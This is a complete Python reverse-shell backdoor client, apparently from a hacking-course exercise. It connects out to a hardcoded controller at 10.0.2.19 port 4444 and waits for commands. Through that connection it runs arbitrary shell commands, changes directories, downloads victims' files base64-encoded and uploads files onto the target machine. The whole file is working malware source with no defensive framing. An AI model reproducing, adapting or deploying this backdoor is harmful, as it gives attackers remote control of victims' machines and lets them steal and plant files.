#!/usr/bin/env python
import os
import socket
import subprocess
import json
import base64

class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        #print(f"json_data_send is {json_data}")
        self.connection.send(json_data.encode())

    def reliable_receive(self):
        chunk_json_data_str = ""
        while True:
            try:
                json_data = self.connection.recv(1024)
                json_data = json_data.decode()
                chunk_json_data_str = chunk_json_data_str + json_data
                return json.loads(chunk_json_data_str)
            except json.decoder.JSONDecodeError:
                continue

    def change_working_directory_to(self, path):
        os.chdir(path)
        return "[+] Changing working directory"

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content.encode()))
            return "[+] Upload successful."

    def execute_system_command(self, command):
        try:
            result = subprocess.check_output(command, shell=True)
            return result
        except subprocess.CalledProcessError:
            return b"[-] This command is not found on the target machine."

    def run(self):
        while True:
            command = self.reliable_receive()

            try:
                if command[0] == "exit":
                    self.connection.close()
                    exit()
                elif command[0] == "cd" and len(command) > 1:
                    command_result = self.change_working_directory_to(command[1])
                elif command[0] == "download" and len(command) > 1:
                    command_result = self.read_file(command[1])
                    command_result = command_result.decode()
                elif command[0] == "upload" and len(command) > 1:
                    command_result = self.write_file(command[1], command[2])
                else:
                    command_result = self.execute_system_command(command)
                    command_result = command_result.decode()
            except Exception:
                command_result = "[-] Error during command execution."

            self.reliable_send(command_result)

my_backdoor = Backdoor("10.0.2.19", 4444)
my_backdoor.run()
